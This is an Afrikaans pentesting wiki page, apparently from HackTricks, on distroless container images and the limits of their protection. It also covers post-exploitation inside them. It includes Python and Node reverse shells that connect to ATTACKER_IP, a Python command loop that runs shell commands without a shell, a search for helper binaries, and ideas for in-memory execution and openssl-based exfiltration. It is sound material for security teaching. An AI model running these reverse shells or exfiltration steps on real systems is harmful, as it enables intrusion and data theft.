# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n **distroless** container image is 'n image wat die **minimum runtime-komponente bevat wat nodig is om een spesifieke toepassing te laat loop**, terwyl die gewone distribution tooling, soos package managers, shells en groot stelle generiese userland utilities, doelbewus verwyder word. In die praktyk bevat distroless images dikwels slegs die application binary of runtime, sy shared libraries, certificate bundles en 'n baie klein filesystem-uitleg.

Die punt is nie dat distroless 'n nuwe kernel isolation primitive is nie. Distroless is 'n **image design strategy**. Dit verander wat **binne** die container filesystem beskikbaar is, nie hoe die kernel die container isoleer nie. Daardie onderskeid is belangrik, omdat distroless die omgewing hoofsaaklik harden deur te verminder wat 'n aanvaller kan gebruik nadat code execution verkry is. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux of enige ander runtime isolation-meganisme nie.

## Waarom Distroless Bestaan

Distroless images word hoofsaaklik gebruik om die volgende te verminder:

- die image-grootte
- die operasionele kompleksiteit van die image
- die aantal packages en binaries wat vulnerabilities kan bevat
- die aantal post-exploitation tools wat by verstek vir 'n aanvaller beskikbaar is

Daarom is distroless images gewild in production application deployments. 'n Container wat geen shell, geen package manager en byna geen generiese tooling bevat nie, is gewoonlik makliker om operasioneel te verstaan en moeiliker om ná compromise interaktief te misbruik.

Voorbeelde van bekende distroless-style image families sluit in:

- Google's distroless images
- Chainguard hardened/minimal images

## Wat Distroless Nie Beteken Nie

'n Distroless container is **nie**:

- outomaties rootless nie
- outomaties non-privileged nie
- outomaties read-only nie
- outomaties deur seccomp, AppArmor of SELinux beskerm nie
- outomaties veilig teen container escape nie

Dit is steeds moontlik om 'n distroless image met `--privileged`, host namespace sharing, gevaarlike bind mounts of 'n gemounte runtime socket te laat loop. In daardie scenario mag die image minimaal wees, maar die container kan steeds katastrofies onveilig wees. Distroless verander die **userland attack surface**, nie die **kernel trust boundary** nie.

## Tipiese Operasionele Eienskappe

Wanneer jy 'n distroless container compromise, is die eerste ding wat jy gewoonlik opmerk dat algemene aannames nie meer waar is nie. Daar mag geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat` en soms nie eens 'n libc-gebaseerde omgewing wees wat optree soos wat jou gewone tradecraft verwag nie. Dit beïnvloed beide offense en defense, omdat die gebrek aan tooling debugging, incident response en post-exploitation anders maak.

Die algemeenste patrone is:

- die application runtime bestaan, maar min anders bestaan
- shell-gebaseerde payloads misluk omdat daar geen shell is nie
- algemene enumeration one-liners misluk omdat die helper binaries ontbreek
- filesystem protections, soos read-only rootfs of `noexec` op writable tmpfs-liggings, is dikwels ook teenwoordig

Daardie kombinasie is wat mense gewoonlik daartoe lei om van "weaponizing distroless" te praat.

## Distroless En Post-Exploitation

Die hoof-offensiewe uitdaging in 'n distroless-omgewing is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die exploited workload code execution in 'n language runtime soos Python, Node.js, Java of Go bied, kan jy moontlik arbitrêre logika uitvoer, maar nie deur die normale shell-centric workflows wat algemeen in ander Linux-targets is nie.

Dit beteken dat post-exploitation dikwels in een van drie rigtings verskuif:

1. **Gebruik die bestaande language runtime direk** om die omgewing te enumereer, sockets oop te maak, files te lees of bykomende payloads te stage.
2. **Bring jou eie tooling in memory** as die filesystem read-only is of writable locations met `noexec` gemount is.
3. **Abuse bestaande binaries wat reeds in die image teenwoordig is** as die application of sy dependencies iets bevat wat onverwags nuttig is.

## Abuse

### Enumereer Die Runtime Wat Jy Reeds Het

In baie distroless containers is daar geen shell nie, maar daar is steeds 'n application runtime. As die target 'n Python-service is, is Python daar. As die target Node.js is, is Node daar. Dit bied dikwels genoeg funksionaliteit om files te enumereer, environment variables te lees, reverse shells oop te maak en in-memory execution te stage sonder om ooit `/bin/sh` aan te roep.

'n Eenvoudige voorbeeld met Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
’n Eenvoudige voorbeeld met Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impak:

- herwinning van omgewingsveranderlikes, wat dikwels credentials of service endpoints insluit
- filesystem enumeration sonder `/bin/ls`
- identifisering van skryfbare paaie en gemounte secrets

### Reverse Shell Sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, kan ’n klassieke shell-gebaseerde reverse shell onmiddellik misluk. In daardie situasie, gebruik eerder die geïnstalleerde language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
As `/bin/sh` nie bestaan nie, vervang die laaste reël met direkte Python-gedrewe command execution of ’n Python REPL-loop.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Weer eens, indien `/bin/sh` afwesig is, gebruik Node se filesystem-, process- en networking-API's direk in plaas daarvan om 'n shell te spawn.

### Volledige voorbeeld: Python Command Loop Sonder Shell

Indien die image Python het maar glad nie 'n shell nie, is 'n eenvoudige interaktiewe loop dikwels genoeg om volledige post-exploitation-vermoëns te behou:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dit vereis nie ’n interaktiewe shell binary nie. Die impak is vanuit die aanvaller se perspektief effektief dieselfde as ’n basiese shell: command execution, enumeration en staging van verdere payloads deur die bestaande runtime.

### In-Memory Tool Execution

Distroless images word dikwels gekombineer met:

- `readOnlyRootFilesystem: true`
- writable maar `noexec` tmpfs soos `/dev/shm`
- ’n gebrek aan package management tools

Daardie kombinasie maak klassieke workflows van “download binary to disk and run it” onbetroubaar. In sulke gevalle word memory execution techniques die hoofantwoord.

Die toegewyde bladsy daarvoor is:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die mees relevante techniques daar is:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bestaande Binaries Reeds In Die Image

Sommige distroless images bevat steeds binaries wat operasioneel noodsaaklik is en ná compromise nuttig word. ’n Gereeld waargenome voorbeeld is `openssl`, omdat applications dit soms vir crypto- of TLS-verwante take nodig het.

’n Vinnige search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
As `openssl` teenwoordig is, kan dit moontlik gebruik word vir:

- uitgaande TLS-verbindings
- data-exfiltration oor ’n toegelate egress-kanaal
- staging van payload-data deur geënkodeerde/geënkripteerde blobs

Die presiese misbruik hang af van wat werklik geïnstalleer is, maar die algemene idee is dat distroless nie "glad geen tools nie" beteken nie; dit beteken "baie minder tools as ’n normale distribution image".

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die image werklik distroless is in die praktyk, en watter runtime- of helper-binaries nog vir post-exploitation beskikbaar is.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Wat hier interessant is:

- As geen shell bestaan nie, maar ’n runtime soos Python of Node teenwoordig is, behoort post-exploitation oor te skakel na runtime-gedrewe uitvoering.
- As die root filesystem read-only is en `/dev/shm` skryfbaar maar `noexec` is, word memory execution-tegnieke baie meer relevant.
- As helper binaries soos `openssl`, `busybox` of `java` bestaan, kan hulle genoeg funksionaliteit bied om verdere toegang te bewerkstellig.

## Runtime-verstekke

| Image / platform-styl | Verstektoestand | Tipiese gedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | Geen shell, geen package manager, slegs application/runtime dependencies | die byvoeging van debugging layers, sidecar shells, of die kopiëring van busybox of tooling |
| Chainguard minimal images | Minimal userland by design | Verminderde package-oppervlak, dikwels gefokus op een runtime of diens | die gebruik van `:latest-dev` of debug-variante, of die kopiëring van tools tydens build |
| Kubernetes workloads wat distroless images gebruik | Hang af van Pod-configurasie | Distroless beïnvloed slegs userland; die Pod se sekuriteitsposisie hang steeds van die Pod-spec en runtime-verstekke af | die byvoeging van ephemeral debug containers, host mounts, of privileged Pod-instellings |
| Docker / Podman wat distroless images uitvoer | Hang af van run flags | Minimal filesystem, maar runtime-sekuriteit hang steeds van flags en daemon-konfigurasie af | `--privileged`, die deel van host namespaces, runtime-socket mounts, of skryfbare host binds |

Die kernpunt is dat distroless ’n **image-eienskap** is, nie ’n runtime-beskerming nie. Die waarde daarvan kom uit die vermindering van wat ná ’n compromise binne die filesystem beskikbaar is.

## Verwante bladsye

Vir filesystem- en memory-execution-bypasses wat algemeen in distroless-omgewings benodig word:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir container runtime-, socket- en mount-abuse wat steeds op distroless workloads van toepassing is:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
